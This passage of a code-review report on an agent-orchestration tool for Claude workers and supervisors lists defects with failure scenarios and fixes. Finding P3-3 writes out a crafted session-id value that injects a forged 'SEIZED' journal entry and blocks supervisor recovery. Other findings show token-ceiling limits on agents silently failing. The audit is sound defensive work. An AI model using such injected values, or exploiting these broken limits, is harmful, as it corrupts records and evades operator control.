bin/fleet.py:13625/13635/13637, inside `_render_successor_task`:

    1. Run: "{py}" {fleet_py} sup-boot --handoff-inc {successor_inc} --handoff-token {handoff_token}
    3. Poll every ~30s (up to 10 minutes): "{py}" {fleet_py} sup-status --json
         "{py}" {fleet_py} sup-checkpoint "claim received via handoff from {old_inc}" --nonce <YOUR-NONCE>

`{py}` is quoted; `{fleet_py}` is not. Its sibling renderer `_render_sup_spawn_task` was explicitly fixed for exactly this and says so in its own docstring (:13396, "NEW-2: every rendered path is double-quoted -- a space under FLEET_HOME must not split the command") and renders `"{py}" "{fleet_py}" sup-boot > "{bundle}" 2>&1` (:13408). The fix-wave test file pins ONLY the sup-spawn renderer — tests/test_supspawn_fixwave2.py:143 `TestRenderedCommandQuoting`, including `test_space_in_fleet_home_renders_quoted_commands`, which calls `fleet._render_sup_spawn_task(...)` and never touches `_render_successor_task`. Reproduced:

    fleet.FLEET_HOME = Path('C:/Users/Jane Doe/claude-fleet')
    fleet._render_successor_task('inc-new','inc-old','tok-abc')
    -> 1. Run: "...python.exe" C:/Users/Jane Doe/claude-fleet/bin/fleet.py sup-boot --handoff-inc inc-new --handoff-token tok-abc

FLEET_HOME is `Path(os.environ["FLEET_HOME"])` or the repo root (:83-86) — a Windows user profile such as `C:\Users\Jane Doe` is an entirely ordinary value.

**Failure scenario**

FLEET_HOME contains a space (repo cloned under `C:\Users\Jane Doe\claude-fleet`). A supervisor runs `fleet sup-handoff-begin`. The predecessor mints the one-shot token, writes its hash into the claim, appends the pending entry, writes the successor task file and dispatches the successor body (:13893). The successor obediently runs step 1; the shell word-splits the unquoted path and python is handed `C:/Users/Jane` — 'can't open file', exit 2. `supervisor/HANDSHAKE` is never written, so `sup-handoff-complete` refuses (`hs.get("handoff_token_hash") != expected_hash`, :14082-14083). Steps 3's `sup-status --json` poll and the post-transfer `sup-checkpoint` fail identically, so after 10 minutes the successor emits HANDOFF-ORPHAN. The claim never transfers, the predecessor's claim now carries a `handoff_token_hash` for a body that can never present it, and the only plaintext copy of the token is in the successor's task file — the handoff is unrecoverable except via `sup-handoff-abort`. Supervisor continuity is lost on every handoff attempt, permanently, on that machine.

**Fix**

Quote `{fleet_py}` in all three rendered commands in `_render_successor_task` (lines 13625, 13635, 13637), exactly as `_render_sup_spawn_task` does, and extend tests/test_supspawn_fixwave2.py::TestRenderedCommandQuoting with the same `space in FLEET_HOME` assertion against `_render_successor_task` so the two renderers cannot drift again.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* Reachability holds on every axis I was asked to attack. (1) The path is live: bin/fleet.py:16285 registers `sup-handoff-begin`, :16441 dispatches to `cmd_sup_handoff_begin`, and :13804 calls `_render_successor_task(...)` unconditionally on the begin path — no flag, no dead branch. (2) The assumed input is unvalidated: FLEET_HOME comes from `Path(os.environ["FLEET_HOME"])` or the repo root (:85-86), or `--fleet-home` (:7798-7799); I grepped for any whitespace/space guard and found none. The only space-related code is `_hook_py_tokens` at :8010, whose comment states spaced install paths are a supported real case ("a prior fix for spaced install paths, e.g. C:/Users/.../python.exe"). (3) No upstream normalization: the repo's convention is the opposite — worker-settings.template.json quotes both {{PYTHON}} and {{FLEET_HOME}}; `_steer_supervisor_release` (:6236) renders `"{py}" "{fleet_py}" sup-release`; `_render_sup_spawn_task` (:13410) renders `"{py}" "{fleet_py}" sup-boot`. `_render_successor_task` is the single outlier. (4) I reproduced the render verbatim with FLEET_HOME = 'C:/Users/Jane Doe/claude-fleet' and got the unquoted fleet.py path on all three lines (:13627, :13637, :13639 in the current file), while the sibling renderer produced quoted paths under the same FLEET_HOME. (5) The test-coverage claim checks out: tests/test_supspawn_fixwave2.py:143-180 TestRenderedCommandQuoting exercises only `_render_sup_spawn_task`; the successor renderer's only pins (tests/test_supervisor.py:3751/3760) assert the interpreter, and their regex `"([^"]*)"\s+\S*fleet\.py` uses \S* so it cannot even match a spaced path. Where the finding overreaches: fleet never executes this string. :13907 appends the prompt "Read <task file> and follow it exactly." and :13909 runs an argv list with no shell=True, so the consumer is a Claude successor body issuing its own Bash calls — an LLM may quote the spaced path itself, making the failure probable rather than deterministic. skills/fleet/SKILL.md:95 also records that handoff dispatch is "still unproven end to end -- eight stillbirths across two days -- so prefer release-then-spawn", lowering exposure without making the path unreachable. That trims the severity language, not the defect.
- *(confidence: high)* I re-read the cited code and could not refute it. bin/fleet.py:13627/13637/13639 (reviewer's 13625/13635/13637 are off by two, same block) render `"{py}" {fleet_py} sup-boot|sup-status|sup-checkpoint` — the interpreter is double-quoted, the fleet.py path is not. The sibling renderer `_render_sup_spawn_task` documents the exact opposite doctrine at bin/fleet.py:13396-13398 ("NEW-2: every rendered path is double-quoted -- a space under FLEET_HOME must not split the command") and renders `"{py}" "{fleet_py}"` at :13410 and :13438, so the project's own standard classifies the unquoted form as a defect rather than style. I reproduced the render with FLEET_HOME=Path('C:/Users/Jane Doe/claude-fleet') and got all three lines unquoted, matching the reviewer's output exactly. The coverage gap is real: tests/test_supspawn_fixwave2.py:145 TestRenderedCommandQuoting (3 tests, all pass under py -3.13) calls only fleet._render_sup_spawn_task; the only tests touching _render_successor_task are tests/test_supervisor.py:3740 TestSuccessorInterpreterIsPortable, which assert interpreter portability, and its regex at :3762 (r'"([^"]*)"\s+\S*fleet\.py') matches whether or not fleet.py is quoted, so it cannot catch this. FLEET_HOME is Path(os.environ["FLEET_HOME"]) or the repo root, so a spaced Windows profile path is an ordinary value. Where the finding overreaches: (1) the rendered text is an LLM prompt body written to state/supervisor-handoff-<inc>.md at :13803, not a shell script — the successor Claude body issues the command itself and may quote the visibly-spaced path, and a python 'can't open file' exit 2 is not the exit-5 handoff-refused STOP condition, so it can retry corrected; (2) 'unrecoverable' is too strong, since the pending entry appended at :13795 keeps the attempt abortable via sup-handoff-abort; (3) spaced FLEET_HOME is already unsupported elsewhere — bin/fleet.py:3670 renders the statusline command as f"{Path(sys.executable).resolve().as_posix()} {script}", also unquoted and also shell-executed. So the defect and the proposed fix stand, but the severity claim ('permanently, on every handoff attempt, unrecoverable') is not proven.

---

### P2-11 — terminal-surface.md, the D4 spec of record, still asserts the pre-fix behaviour as current

- **Severity:** medium  |  **Verdict:** CONFIRMED  |  **Dimension:** `views-doctrine`  |  **Category:** doc-drift
- **Location:** `docs/specs/terminal-surface.md:70`

**What is wrong**

Root `CLAUDE.md` sends every reader here for D4 receipts, but the document's present-tense claims are now false of shipped code:

- :70 — "`fleet status` (bare), `fleet peek`, `fleet result` and `fleet doctor` each take `fleet_lock()` and then `load_registry()` ... They quarantine and they contend for the lock." `cmd_peek` (:4341) and `cmd_result` (:4392) call `read_registry_no_repair` and take no lock at all; `cmd_doctor` (:9087) quarantines only under `--repair`; `cmd_status`'s pre-probe read (:4062) no longer quarantines.
- :71 — "`commands/{status,peek,result,overview}.md` inline the **bare** verbs". `commands/status.md:6` and `commands/overview.md:14` now inline `!`fleet status --stale-ok``.
- :115 — "they inline `fleet status` / `fleet peek` / `fleet result` / `fleet doctor`, all of which take `fleet.lock` and quarantine a corrupt registry."
- :261 — the error-handling table: `| fleet.json unparseable | ... | CLI quarantines + exits 1 (§11) |`. Measured: `/fleet:status` exits **0** printing `fleet: registry unreadable`, and peek/result exit 1 **without** quarantining.
- :367 — "Every read-only slash command inlines a bare verb; none of them goes through `status_snapshot()`."
- :287 — invariant 6: "this invariant is presently violated through the slash-command surface."

:68 instructs "this paragraph is not to be deleted until they [the receipts] say something else" — but the receipts are pinned `# at 02bf276`, a historical commit, so by their own contract they can never say anything else. The instruction is self-sealing while `CLAUDE.md:13` declares the split "now-discharged".

**Failure scenario**

An agent or reviewer follows CLAUDE.md's pointer ("Receipts + the (now-discharged) REQUIREMENT/CURRENT-STATE split: `docs/specs/terminal-surface.md` D4") to determine whether a read verb may quarantine. It reads that `/fleet:peek` takes `fleet.lock` and quarantines, and that closing the gap "is the `doctor-repair` slice's job" — a slice that already merged. It then either re-implements the already-shipped fix, or reasons from the table row at :261 that a corrupt registry is expected to be quarantined by `/fleet:status` and removes a guard that is load-bearing. The two documents CLAUDE.md names as the pair now contradict each other on the repo's most load-bearing invariant.

**Fix**

Rewrite D4's CURRENT STATE, the diagram paragraph (:115), the error-handling table row (:261/:266), invariant 6 (:287) and the receipts lead-in (:367) to describe shipped behaviour, marking the `02bf276` receipts as historical evidence of the closed gap rather than as the current measurement. Re-run `tests/test_views_doctrine.py::test_known_claim_sites_are_all_found` afterwards, which floors the recognised claim-paragraph count at 5.

**Verification** — 2 independent skeptics, neither could refute:

- *(confidence: high)* I could not refute it. Every code citation checks out and I reproduced the behaviour by execution. bin/fleet.py:4343 (cmd_peek) and :4394 (cmd_result) call read_registry_no_repair() with no fleet_lock(); :4064 is cmd_status's non-quarantining pre-probe read; :9089 shows cmd_doctor uses read_registry_no_repair(hint=False) unless repair=bool(getattr(args,"repair",False)). commands/status.md:6 and commands/overview.md:14 both inline `fleet status --stale-ok`, not the bare verb. Probe against a corrupt registry in a throwaway FLEET_HOME: `status --stale-ok` rc=0 "fleet: registry unreadable" file survives; `peek w`/`result w` rc=1 file survives; `doctor` rc=1 file survives, printing "[FAIL] registry: ... Rerun as `fleet doctor --repair`". Lock-contention probe (pre-created state/fleet.lock, valid registry): bare `status` TAKES fleet.lock; `status --stale-ok`, `peek`, `result`, `doctor` are all lock-free. 02bf276 is an ancestor of HEAD and the doctor-repair merge (9739e74) came after it, so terminal-surface.md:115, :261/:266, :287 and :75 assert behaviour the shipped code does not have, while CLAUDE.md:13 routes every reader to that D4 section. tests/test_views_doctrine.py passes 11 / skips 2, the skip being "no view quarantines any more", so no test catches the stale prose. No misread of control flow, platform (Windows probes run and confirm), stdlib semantics, or existing test coverage.
- *(confidence: high)* Every claim is verified against shipped code and by live measurement. cmd_peek (bin/fleet.py:4343) and cmd_result (:4394) call read_registry_no_repair() with no fleet_lock(); cmd_status's pre-probe read (:4064) is likewise read_registry_no_repair(); cmd_doctor (:9084-9090) quarantines only under --repair ("the ONE quarantine site left"). commands/status.md:6 and commands/overview.md:14 inline `fleet status --stale-ok`, not the bare verb. Live probe in an isolated FLEET_HOME with a corrupt state/fleet.json: `status --stale-ok` exits 0 printing "fleet: registry unreadable" and the file survives; peek/result/doctor exit 1 and the file survives. So terminal-surface.md:35, :70, :71, :75, :115, :261, :266, :287 and :367 all assert behaviour the code no longer has. Reachability lens does not refute: the doc is not dead text — CLAUDE.md:13 explicitly routes readers to D4 for receipts, the doc carries no superseding banner (:3 still "ready-for-build"), and its last commit f94045f is an ancestor of the doctor-repair merge 9739e74, so it was never revised after the fix. No upstream guard catches it: tests/test_views_doctrine.py:238 now skips by design, and test_known_claim_sites_are_all_found (:320) enforces only a floor of 5 recognised claim paragraphs, which a stale-but-present paragraph satisfies. The only mitigating detail is that :64/:68 date-stamp their measurement at 02bf276; but :35, :75, :115, :261, :266 and :287 are unqualified present tense, and :75 assigns the fix to a slice that already merged.

---

## P3 — UNVERIFIED, needs triage (19)

**Never adversarially verified** (verifier auth expiry, or ranked below the per-dimension top-4 cap).
Treat each as a claim to check, not a defect to fix. Triage the critical and high ones first — if they
hold up they outrank most of P2.

### P3-1 — sup-boot commits the claim, then crashes before printing the one-copy NONCE if GOALS.md is not valid UTF-8

- **Severity:** critical  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/supervisor-journal-and-postcompact`  |  **Category:** correctness
- **Location:** `bin/fleet.py:11608`

**What is wrong**

`_render_boot_bundle` guards the operator-owned prose reads against OSError only:

```
11607:    try:
11608:        goals = goals_path().read_text(encoding="utf-8").rstrip()
11609:    except OSError:
11610:        goals = "(supervisor/GOALS.md missing)"
```

(and identically for `knowledge/INDEX.md` at :11622-11625, and `supervisor_journal_entries` at :11074-11076). `Path.read_text(encoding="utf-8")` raises `UnicodeDecodeError`, a subclass of `ValueError`, which is NOT OSError. The call site is AFTER the committed state change:

```
11779:                supervisor_journal_append("BOOT", inc, caller_sid, f"fresh claim: {reason}")
...
11833:        rc = SUPERVISOR_BOOT_RC[verdict]
11834:
11835:    bundle = _render_boot_bundle(entries, status_snapshot(), supervisor_journal_entries())
...
11841:    _deliver_notices(notices)   # <- the ONLY place `NONCE: <plaintext>` is printed
```

The surrounding code knows this decode class exists and guards for it everywhere else — `supervisor_goals_active` (:14418-14422) even documents it verbatim: "ValueError covers UnicodeDecodeError: an undecodable GOALS.md must not crash the unguarded read-only callers". `read_tier_policy` (:10155) does the same. These three supervisor-prose readers were left bare.

**Failure scenario**

Operator saves `supervisor/GOALS.md` from an editor in a legacy codepage (any latin-1/cp1252 byte, e.g. 0xE9 in "opérateur"). `fleet sup-boot --sid sid-me` with no existing claim: (1) mints inc + nonce, writes `supervisor/INCARNATION` with `nonce_hash`/`nonce_seq=1`, appends the `BOOT` entry to the git-tracked JOURNAL.md; (2) `_render_boot_bundle` raises `UnicodeDecodeError: 'utf-8' codec can't decode byte 0xe9`; (3) `main()`'s `except (..., ValueError, ...)` arm at :16465 prints `fleet: 'utf-8' codec can't decode byte 0xe9...` and returns 1; (4) `_deliver_notices` never runs, so the nonce PLAINTEXT — which §5.8 states is "printed exactly once, on the minting verb's own stdout. No other copy anywhere" — is destroyed. Verified in a sandboxed FLEET_HOME: claim present with `nonce_hash` set, stdout contains no `NONCE`, and the very next `fleet sup-checkpoint` raises `SupervisorContinuityError: sup-checkpoint: continuity proof failed (expected generation 1) -- a second body of your lineage may be acting. STOP...`. Re-running `sup-boot` does not recover: `_claim_resume_allowed` requires `nonce_valid`, so `supervisor_claim_decision` falls to :11530 `if holder_live and not (holder_sid == caller_sid and nonce_valid)` -> `refuse` (rc 2), because the booting body is itself roster-live. The supervisor holds a claim it can neither use nor release; it is wedged until the heartbeat ages past the stale threshold and someone seizes.

**Fix**

Read the three prose files tolerantly, matching the module convention: `read_text(encoding="utf-8", errors="replace")` at :11608, :11624 and :11074 (or widen the handlers to `except (OSError, ValueError)`). Additionally, move `_deliver_notices(notices)` ahead of the bundle render, or wrap the render in a try/except that still emits the notices — a display failure must never be able to swallow state that was already committed under the lock.

**Verification:** none — see the review limits above.

---

### P3-2 — --token-ceiling is inert fleet-side: _native_cumulative_tokens counts ~1/17th of real usage

- **Severity:** critical  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** broken-invariant
- **Location:** `bin/fleet.py:1514`

**What is wrong**

`_native_cumulative_tokens` (bin/fleet.py:1502) sums only two fields of each outcome record:

```python
for rec in read_outcomes(name):
    if not isinstance(rec, dict) or rec.get("kind") != "result":
        continue
    for key in ("input_tokens", "output_tokens"):
```

Those two fields come from `bin/hooks/stop_outcome.py:196-197`, inside a loop over EVERY assistant record that keeps overwriting:

```python
            tokens_in = usage.get("input_tokens")
            tokens_out = usage.get("output_tokens")
```

so the record holds the LAST assistant message's usage, not the turn's total. And `input_tokens` on a cached Claude Code assistant message is the UNCACHED remainder only — the same file writes `cache_creation_input_tokens`/`cache_read_input_tokens` separately at :242-243, and fleet.py:1873 names all three as the summands of a prompt (`_OCCUPANCY_USAGE_FIELDS`). `_native_cumulative_tokens` reads neither cache field.

Measured against this repo's live `state/outcomes/`:
- `state/outcomes/97e20f89-....jsonl`: 24 `kind=="result"` records -> `_native_cumulative_tokens` = **11,955**; the peak occupancy recorded in the very same records = **224,979**.
- `state/outcomes/sup~inc-20260726T223247Z-bffe~successor.jsonl`: 5 records -> **3,248**, peak occupancy **230,216**.
- A real transcript (`~/.claude/projects/C--proga-claude-fleet/36231e78-....jsonl`, 696 assistant usage records): last-assistant in+out = **555**, i.e. that entire turn contributes 555 to the ceiling while its prompt was 485,158 tokens.

docs/getting-started.md:93 asserts "`--token-ceiling` caps total tokens — a worker that would exceed it refuses the next turn rather than burning through your budget unwatched." SPEC.md:240 asserts "`_native_cumulative_tokens` ... sums the outcome store" as the enforcement.

**Failure scenario**

`fleet spawn w1 --dir X --task Y --token-ceiling 200000`. The worker runs 24 turns and consumes >220k tokens of context per turn (measured: 224,979). `fleet send w1 "..."` at :4811 evaluates `used = 11955 >= 200000` -> False, so the steer is allowed and the worker keeps running. The cap the operator set to bound a long babysat job never fires — it would need roughly 400 turns of that shape to trip. The documented protection does not exist.

**Fix**

Sum the same three prompt summands the rest of the file already agrees on. Either (a) make `_native_cumulative_tokens` use the maximum of `input_tokens + cache_creation_input_tokens + cache_read_input_tokens` across records (a context-occupancy ceiling, comparable to `_transcript_occupancy`/`BAND_HARD_TOKENS`), or (b) make `stop_outcome._transcript_result` accumulate per-turn deltas rather than keeping the last message's snapshot, and have `_native_cumulative_tokens` add the cache fields. Whichever is chosen, the hook's `_current_tokens` must be changed to the identical formula — see the next finding.

**Verification:** none — see the review limits above.

---

### P3-3 — supervisor_journal_append interpolates `sid` into the entry header unvalidated, defeating the body header-injection escape one line above

- **Severity:** high  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/supervisor-journal-and-postcompact`  |  **Category:** input-validation
- **Location:** `bin/fleet.py:11103`

**What is wrong**

The writer deliberately escapes the BODY against header injection, then interpolates the header's own fields raw:

```
11089:    if kind not in SUPERVISOR_JOURNAL_KINDS:      # `kind` IS validated
...
11095:    # Header-injection escape: a body line that itself looks like an entry
11096:    # header (e.g. a quoted/pasted journal excerpt) must never be able to
11097:    # parse back out as a real entry -- prefix it with a space ...
11099:    safe_body = "\n".join(
11100:        f" {line}" if _SUPERVISOR_ENTRY_RE.match(line) else line
11101:        for line in body.rstrip().splitlines()
11102:    )
11103:    entry = f"\n## {now_iso()} {kind} inc={inc} sid={sid}\n\n{safe_body}\n"
```

`sid` is `caller_sid`, which is `getattr(args, "sid", None) or current_caller_session()` (:11647, :12494) — argv or `$CLAUDE_CODE_SESSION_ID`, never shape-checked anywhere. A newline in it emits arbitrary extra lines into the append-only journal, and `parse_supervisor_journal` (:11050) reads them back as genuine entries. The body escape is bypassed through the adjacent field on the same f-string. A whitespace-only (no newline) sid is the softer variant: `sid=(?P<sid>\S+)\s*$` no longer matches the emitted header, so the entry silently VANISHES from `supervisor_journal_entries()` and its body is absorbed into the preceding entry's body (verified: two appends -> 1 parsed entry).

**Failure scenario**

`fleet sup-checkpoint "harmless body" --sid $'sid-me\n## 2099-01-01T00:00:00Z SEIZED inc=inc-evil sid=sid-evil\n\nI seized the claim.'` (or the same value arriving through `CLAUDE_CODE_SESSION_ID`). Verified: JOURNAL.md now parses to TWO entries, the second a fabricated `SEIZED inc=inc-evil` dated 2099, and `supervisor_journal_latest()` returns it. That value is fed straight into the recovery decision at :11740/:11751. Verified against `supervisor_claim_decision` with a roster-gone holder whose heartbeat is 9h stale: clean journal -> `('seize', 'holder roster-gone, heartbeat stale (32401s > 3600s)')`; poisoned journal -> `('refuse', "journal's latest checkpoint is a fresher incarnation (inc-evil) -- transition in flight")` at :11553-11560, because the fabricated ts of 2099 is greater than every future heartbeat. The supervisor tier can never be recovered by `sup-boot` again, and the only remedy is hand-editing a file the seed text (:10069) declares "Never edit or delete entries." The fabricated header is also re-emitted verbatim into every boot bundle at :11616 as a real checkpoint.

**Fix**

Validate the two remaining header fields at the same choke point that already validates `kind`: reject `inc`/`sid` that are empty or contain any whitespace, e.g. `for label, val in (("inc", inc), ("sid", sid)):` `if not val or any(c.isspace() for c in str(val)): raise ValueError(...)`. That makes both the injection and the vanishing-entry variant unrepresentable, and keeps the round trip total (every header the writer emits is one the reader parses back).

**Verification:** none — see the review limits above.

---

### P3-4 — PostCompact hook's _valid_token accepts Windows reserved device names; a worker named `nul` loses every compaction landmark with no error anywhere

- **Severity:** high  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/supervisor-journal-and-postcompact`  |  **Category:** silent-failure
- **Location:** `bin/hooks/postcompact_journal.py:30`

**What is wrong**

```
30: def _valid_token(value):
31:     """Reject anything that isn't a plain, filename-safe token. Guards the
32:     journal path against traversal via session_id or a malformed registry
33:     name ..."""
36:     if ".." in value: return False
38:     if os.path.basename(value) != value: return False
40:     if not _SAFE_TOKEN_RE.fullmatch(value): return False
```

`_SAFE_TOKEN_RE = re.compile(r"[A-Za-z0-9._~-]+")` matches `nul`, `con`, `aux`, `prn`, `com1`. `_journal_path` then builds `state/journals/nul.md` (:154-155) and `main` appends to it (:184-187). On Windows a reserved device name resolves to the DEVICE regardless of extension or directory — measured on this machine with py 3.13: `open('.../journals/nul.md','a')` succeeds, `os.path.exists` -> True, size 0, content discarded; `con.md` -> `ValueError('Must have exactly one of read or write mode')`; `aux.md`/`prn.md`/`com1.md` -> `FileNotFoundError`. `fleet.validate_name` accepts all five (`NAME_RE = ^[a-z0-9-]+$`, `RESERVED_NAMES = frozenset({"supervisor"})` only), so such a worker is spawnable.

**Failure scenario**

`fleet spawn nul <cwd> <task>` (accepted). The worker's session compacts; Claude Code fires the PostCompact hook. Verified end-to-end with FLEET_HOME pointed at a temp dir and a registry mapping the sid to worker `nul`: exit code 0, `state/journals/` is EMPTY (no file created), and `state/hook-errors.log` does not exist — `_log_hook_error` never fires because `open` on NUL raises nothing. The landmark the hook exists to leave is gone, and Kernel 1's "a swallowed hook exception is not invisible" guarantee does not hold for this class. The same path is a black hole fleet-side: `journal_file_path('nul')` -> `state/journals/nul.md`, whose `.exists()` is True and whose `read_text()` is `''`, so `compose_prompt` (:1281-1300) silently carries no journal across every respawn/limit-resume, and `_archive_file_pairs` (:6984) archives an empty `journal.md`. For `con`, the hook logs `ValueError('Must have exactly one of read or write mode')` and still loses the landmark.

**Fix**

Add the reserved-device check to `_valid_token`, before the return: `if value.split('.')[0].lower() in {'con','prn','aux','nul','com1'..'com9','lpt1'..'lpt9'}: return False` (the hook cannot import fleet.py by design, so this is a deliberate duplicate — same as the `|` -> `~` mapping already duplicated at :104). The durable fix is to also add the same set to `fleet.RESERVED_NAMES` so `validate_name` refuses these at the one creation choke point; otherwise the hook merely skips and the fleet-side journal is still a device.

**Verification:** none — see the review limits above.

---

### P3-5 — The same --token-ceiling N is enforced by two counters 16.7x apart; the hook halts the worker while send reports success

- **Severity:** high  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** correctness
- **Location:** `bin/hooks/stop_mailbox.py:118`

**What is wrong**

One operator number, `state/ceilings/<sid>` written by `_write_ceiling_file` (bin/fleet.py:228), is compared against two unrelated measurements.

Hook side, `stop_mailbox._current_tokens` (bin/hooks/stop_mailbox.py:118) — sums in+out over EVERY line of the transcript:
```python
                    for key in ("input_tokens", "output_tokens"):
                        val = usage.get(key)
                        if isinstance(val, int):
                            total += val
```
used at :179-183:
```python
    ceiling = _read_ceiling(session_id)
    if ceiling is not None:
        current = _current_tokens(data.get("transcript_path"))
        if current is not None and current >= ceiling:
            return
```

Fleet side, `_native_cumulative_tokens` (bin/fleet.py:1502) at the refusal arm bin/fleet.py:4811.

Measured on the SAME body (worker sid `97e20f89-8858-47e9-b70c-ee36f3579737`, outcome file + its own recorded `transcript_path`):
- fleet side `_native_cumulative_tokens` = **11,955**
- hook side `_current_tokens` = **199,624**

16.7x apart. No test compares them: `tests/test_hooks.py:674-760` feeds one-record synthetic transcripts, `tests/test_native.py:2401-2416` feeds hand-written outcome records; neither side is ever measured against the other.

Reproduced live (temp FLEET_HOME, `state/ceilings/sid-A` = 100000, `mailbox/sid-A.md` non-empty, transcript of 20 turns): the hook exited 0 with NO `decision: block` and `mailbox/sid-A.md` still on disk — stop allowed, mail not drained.

**Failure scenario**

Worker spawned with `--token-ceiling 100000`. After ~12 turns the hook's count crosses 100,000 while `_native_cumulative_tokens` is still ~6,000. Manager runs `fleet send w1 "switch to the other file"` mid-turn: `_cmd_send_native` takes the working branch, `append_mailbox(sid, message)` succeeds, and it prints `w1: turn running -- message queued to mailbox` — reported success. At turn end the Stop hook returns at :183 BEFORE claiming the mailbox, so the steer is never delivered and the worker stops mid-task. Nothing in `fleet status`, `peek`, or `result` reports the number the hook used, so the operator sees a worker at 6% of its ceiling that silently stopped obeying steers. The documented `send` contract ("mid-turn message delivered at the next tool boundary") is broken with no error anywhere.

**Fix**

Make both sites call one shared token measure. Since the hook cannot import fleet.py, the formula must be duplicated verbatim and pinned by a test that computes both against the SAME fixture transcript+outcome pair and asserts equality (e.g. a test that runs `stop_outcome.py` over a transcript, then `stop_mailbox._current_tokens` and `fleet._native_cumulative_tokens` over the results, and asserts they agree within a stated tolerance).

**Verification:** none — see the review limits above.

---

### P3-6 — respawn zeroes the hook-side ceiling counter but never the fleet-side one, permanently splitting them

- **Severity:** high  |  **Verdict:** UNVERIFIED  |  **Dimension:** `sweep/token-ceiling-three-measures`  |  **Category:** correctness
- **Location:** `bin/fleet.py:5597`

**What is wrong**

`_cmd_respawn_native` carries the ceiling forward (bin/fleet.py:5435-5436) and writes it against a brand-new session:
```python
    _write_ceiling_file(new_sid, token_ceiling)
```
A respawn is a fresh dispatch with no `--resume` (SPEC.md:214), so the new sid's transcript starts empty and `stop_mailbox._current_tokens` restarts at ~0.

But nothing in respawn touches `state/outcomes/<name>.jsonl`. The only deleter is `_remove_worker_files` (bin/fleet.py:6641, `fleet clean`) and the archive move at :6996. `_native_cumulative_tokens(name)` reads that name-keyed file lifetime, across every sid (docstring at :1505: "all past sids/turns").

Respawn also has no `over_ceiling` guard — the status checks at :5413-5460 never look at `before["status"]`, and `over_ceiling` is in `_NATIVE_STICKY` (:2757) only for `recompute`, not for respawn.

**Failure scenario**

Worker `w1` spawned with `--token-ceiling 100000`; `state/outcomes/w1.jsonl` accumulates to 120,000. `fleet send w1 "..."` at :4811 sees `120000 >= 100000`, flags `over_ceiling`, refuses. Operator runs `fleet respawn w1` — the documented context-reset lever, which the refusal message itself points toward. Respawn succeeds and writes `state/ceilings/<new-sid>` = 100000 for a transcript at 0 tokens. Now: (a) the hook's over-ceiling ALLOW-STOP escape hatch is dead for the whole new session — `_current_tokens` restarts at 0 and must re-climb to 100,000, so the hook keeps emitting `decision: block` on every pending mail; (b) `_native_cumulative_tokens("w1")` is still 120,000, so EVERY subsequent `fleet send` on an idle w1 is refused and re-flags `over_ceiling`. The worker gets exactly one turn per respawn and is then permanently un-steerable, while the mechanism designed to let an over-ceiling worker stop is switched off. The only escape is `fleet respawn w1 --token-ceiling <bigger>` on every single respawn, forever.

**Fix**

Make respawn reset the fleet-side counter the same way it resets the transcript — e.g. stamp a `token_baseline` on the new record (mirroring how `cost_baseline` at :5496-5497 already solves exactly this problem for cost) and have `_native_cumulative_tokens` subtract it, or roll `state/outcomes/<name>.jsonl` aside on respawn as the log used to be rotated. Also add an explicit `over_ceiling` branch to respawn that either clears the flag or refuses with the reason.

**Verification:** none — see the review limits above.

---

### P3-7 — getting-started.md tells new operators to `fleet init --autoclean` and claims staleness is handled automatically

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `docs-drift`  |  **Category:** retired-feature-documented-as-shipping
- **Location:** `docs/getting-started.md:143`

**What is wrong**

`docs/getting-started.md:143`:
```
`fleet archive` and the scheduled `fleet autoclean` handle staleness automatically so you rarely have to remember to tidy up. Install the scheduler with `fleet init --autoclean`.
```
`docs/getting-started.md:165` (command table): "`fleet init` | Render machine-local `worker-settings.json` (add `--statusline`, `--autoclean`)".

The flag does not exist (see the previous finding's repro). `README.md:130` and `docs/SPEC.md:220/254` were both updated for the retirement; the user-facing onboarding doc was not. `docs/getting-started.md:50` also still lists 'the autoclean scheduler' as one of the doctor checks — `_doctor_check_autoclean` (`bin/fleet.py:8492`) now reports run-stamp age instead, and its own docstring says the install question 'stopped being an answerable question on 2026-07-27'.

**Failure scenario**

A new operator follows Getting Started end to end. Step: `fleet init --autoclean` → `fleet: error: unrecognized arguments: --autoclean`. They shrug and move on, believing the doc's preceding sentence that staleness is 'handled automatically'. They never wire the sweep into anything, never boot a supervisor, and daemon husks plus un-archived workers accumulate indefinitely with nothing reporting it — the exact 2026-07-16 condition (13 stale workers, 15 husks) autoclean was built for.

**Fix**

Replace `:143` with the tier-driven statement (the sweep runs on the supervisor's watchtower beat and the interface skill's startup ritual; run `fleet autoclean` by hand otherwise), drop `--autoclean` from the `fleet init` row at `:165`, and fix the doctor-check description at `:50` to 'how long since the last autoclean run'.

**Verification:** none — see the review limits above.

---

### P3-8 — three-tier-command.md §6.1/§6.2/§9.1 direct a builder to a scheduler adapter seam that no longer exists

- **Severity:** medium  |  **Verdict:** UNVERIFIED  |  **Dimension:** `docs-drift`  |  **Category:** retired-feature-documented-as-shipping
- **Location:** `docs/specs/three-tier-command.md:791`

**What is wrong**

`docs/specs/three-tier-command.md:791` heading: "### 6.1 The generic installer already exists", followed by "The platform adapter method is already generic over `task_name`, `command`, `interval_hours`" and "A supervisor-beat task is installed by calling the same three methods with `task_name=\"claude-fleet-supervisor-beat\"`" (:803-805). §6.2 at :811-835 prescribes `_fleet_task_is_ours(command, \"beat\")` as the ownership predicate. §9.1 at :1061: "`fleet init --supervisor-beat N` installs a `claude-fleet-supervisor-beat` task via the §6.1 adapter".

All of that machinery was deleted with the timer. Verified at HEAD `d019066`:
```
$ grep -n "autoclean_task_\|_fleet_task_is_ours\|schtasks\|crontab" bin/fleet.py
355:# The scheduler surface (schtasks on Windows, crontab on POSIX) lived here
443:    Was also the crontab scheduling backend for autoclean until the timer was
```
— comments only; no `autoclean_task_install/query/remove`, no `_fleet_task_is_ours`. `docs/SPEC.md:254` and `docs/specs/autoclean.md:9-33,103-115` both record the deletion; `docs/specs/three-tier-command.md` carries no superseding note anywhere (`grep -in "retired\|superseded\|amendment"` in that file returns nothing about the scheduler).

The receipts in §6.1/§6.2 are pinned `# at 235421e5…` and still verify — correctly, as history — which makes the stale prose harder to spot, not easier.

**Failure scenario**

